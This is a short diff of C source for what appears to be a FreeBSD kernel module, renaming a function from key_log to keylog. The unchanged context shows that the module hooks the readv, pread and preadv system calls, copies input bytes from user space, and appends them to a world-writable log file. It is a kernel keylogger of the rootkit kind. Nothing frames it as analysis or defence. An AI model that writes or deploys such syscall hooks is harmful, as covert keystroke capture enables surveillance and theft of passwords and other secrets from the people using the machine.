@@ -24,7 +24,7 @@
 #include <sys/syscallsubr.h>
 #include <sys/pcpu.h>
 
-int key_log(struct thread *td, char * buf){
+int keylog(struct thread *td, char * buf){
 
      int openError = kern_openat(td,AT_FDCWD,keyLogPath, UIO_SYSSPACE, O_WRONLY|O_CREAT|O_APPEND,0777);
      if(openError)
@@ -77,7 +77,7 @@ readv_hook(struct thread *td, void *syscall_args) {
          return(error);
      copyinstr(uap->iovp->iov_base, buf, 1, &done);
      
-     int keyError = key_log(td, buf);
+     int keyError = keylog(td, buf);
      if(keyError)
 	return(keyError);
 
@@ -101,7 +101,7 @@ static int pread_hook(struct thread *td, void *syscall_args) {
         return(error);
     copyinstr(uap->buf, buf, 1, &done);
     
-    int keyError = key_log(td, buf);
+    int keyError = keylog(td, buf);
     if(keyError)
 	return(keyError);
 
@@ -126,7 +126,7 @@ static int preadv_hook(struct thread *td, void *syscall_args) {
         return(error);
     copyinstr(uap->iovp->iov_base, buf, 1, &done);
     
-    int keyError = key_log(td, buf);
+    int keyError = keylog(td, buf);
     if(keyError)
 	return(keyError);
 
